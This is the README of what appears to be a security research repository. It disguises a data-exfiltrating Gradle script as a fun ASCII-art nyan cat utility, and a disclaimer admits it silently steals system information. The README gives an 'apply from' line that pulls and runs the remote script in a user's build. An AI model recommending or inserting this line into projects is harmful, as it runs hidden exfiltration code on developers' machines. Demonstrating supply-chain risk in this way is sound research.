**⚠️ DISCLAIMER:**  
This repository and associated scripts are **strictly for research and educational purposes only**.  
It includes intentionally vulnerable code demonstrating how sensitive information could be exfiltrated from within a seemingly benign utility that developers might download and use from GitHub repositories.  
**DO NOT** use or execute this code in any production or real-world environment.
The exfiltration attempt fails silently, ensuring the end user remains unaware of malicious activity, strictly for demonstrating potential vulnerabilities.
This repository is strictly for educational and research purposes only. It demonstrates how sensitive system information might be exfiltrated silently. **Do not run or deploy in a production environment.**

# Gradle TaskGraph ASCII Art

This Gradle script prints an ASCII art whenever the task graph is ready. It uses the `gradle.taskGraph.whenReady` hook to ensure the art appears just before task execution begins.

## Usage

### Importing the Script

To use this script in your Gradle project, import it directly from your GitHub repository. Save the script as a separate file (e.g., `ascii-art.gradle`) in your repository, then reference it in your `build.gradle` file using:

```gradle
apply from: 'https://raw.githubusercontent.com/oxsecurity/gradle-plugin-nyan-cat/refs/heads/main/nyancat.gradle'
```

This script is a fun way to add a little personality to your Gradle tasks! 🚀
